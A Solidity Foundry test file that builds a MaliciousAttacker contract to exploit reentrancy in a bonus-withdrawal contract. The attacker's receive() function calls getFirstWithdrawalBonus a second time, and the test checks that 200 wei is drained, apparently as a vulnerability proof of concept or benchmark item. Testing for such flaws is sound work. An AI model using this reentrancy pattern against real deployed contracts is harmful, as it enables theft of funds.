// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_bonus.sol";

contract MaliciousAttacker {
    Reentrancy_bonus public target;
    bool private reentered;

    constructor(Reentrancy_bonus _target) {
        target = _target;
        reentered = false;
    }

    function initiateAttack() external {
        target.getFirstWithdrawalBonus(address(this));
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            target.getFirstWithdrawalBonus(address(this));
        }
    }
}

contract ReentrancyBonusTest is Test {
    Reentrancy_bonus public reentrancyBonus;
    MaliciousAttacker public attacker;
    uint256 public constant FUNDING_AMOUNT = 0.5 ether;
    uint256 public constant EXPECTED_STOLEN_AMOUNT = 200 wei;

    function setUp() public {
        // Deploy contracts
        reentrancyBonus = new Reentrancy_bonus();
        attacker = new MaliciousAttacker(reentrancyBonus);

        // Fund vulnerable contract
        vm.deal(address(reentrancyBonus), FUNDING_AMOUNT);
    }

    function testReentrancyVulnerability() public {
        console.log("--- BEFORE-Trigger State ---");
        // Record initial state
        uint256 initialContractBalance = address(reentrancyBonus).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        uint256 initialBonusClaims = reentrancyBonus.totalBonusClaims();
        uint256 initialAttackerRewards = reentrancyBonus.userTotalRewards(address(attacker));
        
        console.log("Contract Balance    :", initialContractBalance);
        console.log("Attacker Balance    :", initialAttackerBalance);
        console.log("Total Bonus Claims  :", initialBonusClaims);
        console.log("Attacker Rewards    :", initialAttackerRewards);

        console.log("\n--- Trigger Attack ---");
        // Execute attack
        vm.prank(address(attacker));
        attacker.initiateAttack();

        console.log("\n--- AFTER-Trigger State ---");
        // Record final state
        uint256 finalContractBalance = address(reentrancyBonus).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        uint256 finalBonusClaims = reentrancyBonus.totalBonusClaims();
        uint256 finalAttackerRewards = reentrancyBonus.userTotalRewards(address(attacker));
        
        console.log("Contract Balance    :", finalContractBalance);
        console.log("Attacker Balance    :", finalAttackerBalance);
        console.log("Total Bonus Claims  :", finalBonusClaims);
        console.log("Attacker Rewards    :", finalAttackerRewards);

        // Calculate state changes
        uint256 contractBalanceChange = initialContractBalance - finalContractBalance;
        uint256 attackerBalanceChange = finalAttackerBalance - initialAttackerBalance;
        uint256 bonusClaimsChange = finalBonusClaims - initialBonusClaims;
        uint256 attackerRewardsChange = finalAttackerRewards - initialAttackerRewards;

        console.log("\n--- State Change Analysis ---");
        console.log("Contract Balance Change :", contractBalanceChange);
        console.log("Attacker Balance Change :", attackerBalanceChange);
        console.log("Bonus Claims Change     :", bonusClaimsChange);
        console.log("Attacker Rewards Change :", attackerRewardsChange);

        // Vulnerability verdict logic
        bool balanceChanged = contractBalanceChange > 0 && attackerBalanceChange > 0;
        bool bonusClaimsIncreased = bonusClaimsChange == 2;
        bool rewardsIncreased = attackerRewardsChange == 200;  // 100 wei per bonus claim x 2 = 200
        bool vulnerabilityExists = balanceChanged && bonusClaimsIncreased && rewardsIncreased;

        // Final verdict
        if (vulnerabilityExists) {
            console.log("\nVulnerability Exists: Reentrancy allowed attacker to claim double bonus");
        } else {
            console.log("\nVulnerability not Exist: State changes do not indicate successful exploitation");
        }
        
        // Original verifications for test accuracy
        assertEq(
            attackerBalanceChange,
            EXPECTED_STOLEN_AMOUNT,
            "Attacker should steal 200 wei"
        );
        assertEq(
            contractBalanceChange,
            EXPECTED_STOLEN_AMOUNT,
            "Contract should lose 200 wei"
        );
    }
}